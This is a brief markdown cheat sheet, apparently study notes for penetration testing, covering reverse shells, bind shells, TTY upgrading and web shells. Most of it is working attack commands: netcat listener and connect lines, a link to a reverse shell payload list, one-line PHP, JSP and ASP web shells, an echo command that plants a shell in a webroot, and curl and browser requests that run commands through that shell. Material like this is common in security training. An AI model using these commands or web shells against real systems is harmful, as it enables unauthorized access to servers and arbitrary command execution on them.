## reverse shell
>A reverse shell is a type of shell in which the target system initiates a connection back to the attacker's machine.
>attacker set listner on own and target connect to it

* To set listner use netcat / nc
   `netcat -lvp <port>`
   ### reverse shell payloads link and guide
   > https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c
---
## bind shell
>A bind shell is a type of shell in which a server is set up on the victim's machine, and the attacker connects to it
>malicious program on the victim's machine, which acts as a server, 
 * > **we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.**

* `netcat <target_ip> <target_port>`
  > connect to target after setting server on target

### upgrading tty
> after shell access we cant use arror left,right or up,down for history
> to do that upgrade tty
* In netcat shell use :- **python/stty method**
       `python -c 'import pty; pty.spawn("/bin/bash")'`
* after that use `ctrl + z` to background netcal shell and get to local terminal
* then `stty raw -echo`
* then `fg` to come netcat shell

### fix size of tty shell
  * on local terminal `echo $TERM`
  * on local terminal `stty size`
  * go back to netcat shell
  * on netcat shell `export TERM=output_from_above`
  * on netcat shell `stty row output_above colums output_above`
   ---
## web shell
>A web shell is a script or program that an attacker uploads to a web server to gain unauthorized access to it. Web shells are often written in server-side scripting languages like PHP, ASP, or JSP 

### writing a web shell
>take our command through a GET request
> **php** `<?php system($_REQUEST["cmd"]); ?>`
> **jsp** `<%Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
> **asp** `<% eval request("cmd") %>`

### uploading a web shell
> upload using upload vulnerability
>  if there is **remote code execution** , **write web shell code directly in webroot**

> * find remote host web directory (webroot)
>   **Defaults webroots**
>   | Web Server | Default Webroot |
>   | :-------------   | :-------------------   |
>   | Apache|/var/www/html |
>   |Nginx|/usr/local/nginx/html |
>   |IIS|c:\inetpub\wwwroot\ |
>   |XAMPP|	C:\xampp\htdocs\ |

> * upload in webroot
> ex: 
> 	* `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

### accessing web shell
* by browser
	> `https://server_ip:port/shell.php?cmd=command_to_run`
* by curl
    >`curl http://SERVER_IP:PORT/shell.php?cmd=command_to_run`
 





